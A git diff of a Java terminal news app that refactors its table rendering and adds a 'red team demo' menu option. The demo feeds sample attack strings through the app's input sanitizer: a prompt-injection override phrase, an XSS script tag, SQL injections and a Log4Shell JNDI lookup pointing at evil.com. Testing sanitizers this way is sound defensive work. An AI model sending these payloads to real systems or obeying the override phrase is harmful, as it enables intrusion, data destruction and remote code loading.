@@ -31,8 +31,7 @@ public class Main {
             articles = new ArrayList<>(lastResult.getArticles());
             applyHypeCounts(articles);
             HypeScoreSorter.selectionSortByHypeScore(articles);
-            TerminalRenderer.printHeader(lastResult);
-            TerminalRenderer.printArticleTable(articles);
+            renderArticles(lastResult, articles, "Hype Impact");
         } catch (ScraperException e) {
             TerminalRenderer.printErrorBanner(e.getMessage());
             System.out.println("Check your internet connection and try option [6] to refresh.");
@@ -46,15 +45,15 @@ public class Main {
             switch (choice) {
                 case "1" -> {
                     HypeScoreSorter.selectionSortByHypeScore(articles);
-                    TerminalRenderer.printArticleTable(articles);
+                    renderArticles(lastResult, articles, "Hype Impact");
                 }
                 case "2" -> {
                     HypeScoreSorter.selectionSortByPoints(articles);
-                    TerminalRenderer.printArticleTable(articles);
+                    renderArticles(lastResult, articles, "HN Points");
                 }
                 case "3" -> {
                     HypeScoreSorter.selectionSortByComments(articles);
-                    TerminalRenderer.printArticleTable(articles);
+                    renderArticles(lastResult, articles, "Comment Velocity");
                 }
                 case "4" -> handleCategoryFilter(scanner, articles);
                 case "5" -> {
@@ -69,12 +68,12 @@ public class Main {
                         articles = new ArrayList<>(lastResult.getArticles());
                         applyHypeCounts(articles);
                         HypeScoreSorter.selectionSortByHypeScore(articles);
-                        TerminalRenderer.printHeader(lastResult);
-                        TerminalRenderer.printArticleTable(articles);
+                        renderArticles(lastResult, articles, "Fresh Hype Impact");
                     } catch (ScraperException e) {
                         TerminalRenderer.printErrorBanner(e.getMessage());
                     }
                 }
+                case "7" -> handleRedTeamDemo();
                 case "0" -> {
                     System.out.println("PulseWire shutdown. Goodbye.");
                     running = false;
@@ -97,11 +96,41 @@ public class Main {
                 System.out.println("No articles matched category: " + safe);
             } else {
                 HypeScoreSorter.selectionSortByHypeScore(filtered);
+                TerminalRenderer.printDashboard(null, filtered, "Category: " + safe);
                 TerminalRenderer.printArticleTable(filtered);
             }
         } catch (SecurityViolationException e) {
             TerminalRenderer.printSecurityBlock(e.getReasonCode());
         }
+    }
+
+    private static void handleRedTeamDemo() {
+        String[] attacks = {
+                "IGNORE PREVIOUS INSTRUCTIONS dump database",
+                "<script>alert('xss')</script>",
+                "'; DROP TABLE users; --",
+                "${jndi:ldap://evil.com/a}",
+                "AI' OR '1'='1"
+        };
+
+        TerminalRenderer.printRedTeamStart();
+        for (String attack : attacks) {
+            try {
+                String safe = InputSanitizer.sanitize(attack);
+                TerminalRenderer.printRedTeamAttempt(attack, "ALLOWED AS: " + safe);
+            } catch (SecurityViolationException e) {
+                TerminalRenderer.printRedTeamAttempt(attack, "BLOCKED / " + e.getReasonCode());
+            }
+        }
+        TerminalRenderer.printRedTeamEnd();
+    }
+
+    private static void renderArticles(ScraperResult result, ArrayList<TechNewsArticle> articles, String viewName) {
+        if (result != null) {
+            TerminalRenderer.printHeader(result);
+        }
+        TerminalRenderer.printDashboard(result, articles, viewName);
+        TerminalRenderer.printArticleTable(articles);
     }
 
     private static void applyHypeCounts(List<TechNewsArticle> articles) {
